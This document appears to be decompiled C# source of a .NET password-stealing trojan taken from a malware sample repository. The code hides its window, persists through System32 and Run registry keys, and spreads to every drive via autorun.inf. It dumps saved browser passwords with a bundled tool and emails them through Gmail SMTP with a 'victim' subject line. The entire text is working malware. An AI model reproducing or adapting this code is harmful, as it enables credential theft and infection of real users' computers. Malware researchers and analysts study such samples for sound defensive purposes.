// Decompiled with JetBrains decompiler
// Type: sadfasdfjhbjhbajeb123.Form1
// Assembly: asdfbn23ö4m23n4, Version=1.5.2.3, Culture=neutral, PublicKeyToken=null
// MVID: CF3DD519-BD0D-4928-A701-479DDBBFC6DB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-PSW.MSIL.NetPass.de-1c7d09be238334d3c57027611e228f75c35500cb98e50280bd5ed291cd005c36.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using sadfasdfjhbjhbajeb123.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace sadfasdfjhbjhbajeb123
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("BackgroundWorker1")]
    private BackgroundWorker _BackgroundWorker1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("lblNumb")]
    private Label _lblNumb;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    private string Stub;
    private string text1;
    private string text2;
    private string[] settings;
    private string user;
    private string pass;
    private string Stored;
    private const string FileSplit = "JTRuST";

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TextBox1 = new TextBox();
      this.BackgroundWorker1 = new BackgroundWorker();
      this.TextBox2 = new TextBox();
      this.lblNumb = new Label();
      this.Label1 = new Label();
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(21, 24);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(248, 225);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 0;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(21, (int) byte.MaxValue);
      Point point3 = point1;
      textBox2_1.Location = point3;
      this.TextBox2.Multiline = true;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(248, 112);
      Size size3 = size1;
      textBox2_2.Size = size3;
      this.TextBox2.TabIndex = 1;
      this.lblNumb.AutoSize = true;
      this.lblNumb.Font = new Font("Tahoma", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblNumb.ForeColor = System.Drawing.Color.Red;
      Label lblNumb1 = this.lblNumb;
      point1 = new Point(54, 380);
      Point point4 = point1;
      lblNumb1.Location = point4;
      this.lblNumb.Name = "lblNumb";
      Label lblNumb2 = this.lblNumb;
      size1 = new Size(14, 13);
      Size size4 = size1;
      lblNumb2.Size = size4;
      this.lblNumb.TabIndex = 19;
      this.lblNumb.Text = "0";
      this.Label1.AutoSize = true;
      this.Label1.Font = new Font("Tahoma", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      Label label1_1 = this.Label1;
      point1 = new Point(12, 380);
      Point point5 = point1;
      label1_1.Location = point5;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(42, 13);
      Size size5 = size1;
      label1_2.Size = size5;
      this.Label1.TabIndex = 20;
      this.Label1.Text = "Kayıtlı :";
      this.Timer2.Enabled = true;
      this.Timer2.Interval = 50000;
      this.Timer3.Enabled = true;
      this.Timer3.Interval = 60000;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(0, 0);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.lblNumb);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual BackgroundWorker BackgroundWorker1
    {
      [DebuggerNonUserCode] get => this._BackgroundWorker1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BackgroundWorker1_DoWork);
        if (this._BackgroundWorker1 != null)
          this._BackgroundWorker1.DoWork -= workEventHandler;
        this._BackgroundWorker1 = value;
        if (this._BackgroundWorker1 == null)
          return;
        this._BackgroundWorker1.DoWork += workEventHandler;
      }
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual Label lblNumb
    {
      [DebuggerNonUserCode] get => this._lblNumb;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._lblNumb = value;
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    public string wpv()
    {
      byte[] wpv = sadfasdfjhbjhbajeb123.My.Resources.Resources.wpv;
      FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\wpv.exe", OpenMode.Binary);
      FileSystem.FilePut(1, (Array) wpv, -1L, false, false);
      FileSystem.FileClose(1);
      Interaction.Shell(Interaction.Environ("tmp") + "\\wpv.exe /stext " + Interaction.Environ("tmp") + "\\wpv.txt", AppWinStyle.Hide);
      return System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\wpv.txt");
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Visible = false;
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      this.text1 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.text2 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref this.text1);
      FileSystem.FileGet(1, ref this.text2);
      FileSystem.FileClose(1);
      this.settings = Strings.Split(this.text1, "JTRuST");
      this.user = this.settings[1];
      this.pass = this.settings[2];
      try
      {
        string fileName = Path.GetFileName(Application.ExecutablePath);
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, "C:\\Windows\\System32" + fileName, true);
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue(fileName, (object) "msnmgr");
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Form1.AddStartup(this.Text, Application.ExecutablePath);
        ProjectData.ClearProjectError();
      }
      this.Timer2.Start();
      this.Timer3.Start();
    }

    public static void AddStartup(string Name, string Path) => Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Name, (object) Path, RegistryValueKind.String);

    private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
        ListBox listBox = new ListBox();
        int index1 = 0;
        while (index1 != checked (MyProject.Computer.FileSystem.Drives.Count - 1))
        {
          listBox.Items.Add((object) MyProject.Computer.FileSystem.Drives[index1].ToString());
          checked { ++index1; }
        }
        int index2 = 0;
        while (index2 != listBox.Items.Count)
        {
          try
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) "Sys.exe")));
              MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) "autorun.inf")));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) "Sys.exe")));
            FileSystem.FileOpen(1, Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) "autorun.inf")), OpenMode.Binary);
            FileSystem.FilePut(1, "[autorun]\r\nshellexecute=sys.exe", -1L, false);
            FileSystem.FileClose(1);
            try
            {
              MyProject.Computer.FileSystem.GetFileInfo(Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) "Sys.exe"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
              MyProject.Computer.FileSystem.GetFileInfo(Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) "autorun.inf"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      try
      {
        this.wpv();
        this.TextBox1.Text = System.IO.File.ReadAllText(Interaction.Environ("tmp") + "\\wpv.txt");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer3_Tick(object sender, EventArgs e) => new SmtpClient("smtp.gmail.com")
    {
      Port = 587,
      Credentials = ((ICredentialsByHost) new NetworkCredential(this.user, this.pass)),
      EnableSsl = true
    }.Send(new MailMessage()
    {
      From = new MailAddress(this.user),
      To = {
        this.user
      },
      Subject = "C:\\ Browser Hunter : Şifreler  Kurban : " + MyProject.Computer.Name,
      Body = this.TextBox1.Text
    });
  }
}
